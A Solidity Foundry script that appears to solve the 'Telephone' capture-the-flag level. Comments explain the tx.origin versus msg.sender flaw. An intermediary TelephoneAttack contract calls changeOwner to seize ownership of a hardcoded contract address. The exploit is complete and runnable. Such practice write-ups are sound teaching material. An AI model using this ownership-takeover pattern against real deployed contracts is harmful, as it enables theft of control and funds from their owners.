//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
/*
SOLUTION OBJECTIVES:
- Claim contract ownership
*/

/*
SOLUTION:
- The Telephone contract has a vulnerability where the owner can be changed by a function that checks if the tx.origin is different from the msg.sender.
- We can exploit this by creating a contract that calls the changeOwner function with my address as the argument.
- This will make me the owner of the Telephone contract.

*/

contract TelephoneAttack {
    constructor(address _newOwner, Telephone _telephoneInstance) {
        _telephoneInstance.changeOwner(_newOwner);
    }
}

contract Telephone_solution is Script {
    Telephone public telephoneInstance =
        Telephone(0x0C695423D70a31c495078ECc58245123f17e2fCE);
    function run() external {
        string memory mnemonic = vm.envString("MY_PRIVATE_KEY");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 0);
        vm.startBroadcast(deployerPrivateKey);
        console.log("Owner before exploit:", telephoneInstance.owner());
        new TelephoneAttack(vm.envAddress("MY_ADDRESS"), telephoneInstance);
        console.log("Owner after exploit:", telephoneInstance.owner());
        vm.stopBroadcast();
    }
}
